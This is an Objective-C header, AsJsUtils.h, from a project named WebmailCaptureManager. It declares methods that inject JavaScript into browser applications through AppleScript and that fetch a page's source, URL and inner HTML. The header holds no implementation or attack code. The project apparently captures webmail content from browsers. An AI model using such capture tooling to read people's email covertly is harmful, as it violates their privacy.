//
//  AsJsUtils.h
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 11/7/16.
//  Copyright © 2016 ophat. All rights reserved.
//

#import <Foundation/Foundation.h>

@interface AsJsUtils : NSObject

+ (NSString *) executeJS: (NSString *) aJS app: (NSString *) aAppName;
+ (NSString *) executeJS: (NSString *) aJS app: (NSString *) aAppName delay: (float) aDelay;

+ (NSString *) getPageSourceForApp: (NSString *) aAppName;
+ (NSString *) getUrlForApp: (NSString *) aAppName;
+ (NSString *) getinnerHTMLAppleScriptSourceForApp: (NSString *) aAppName;
+ (NSString *) getAppleScriptSourceForApp: (NSString *) aAppName javaScript: (NSString *) aJavaScript delay: (float) aDelay;

@end
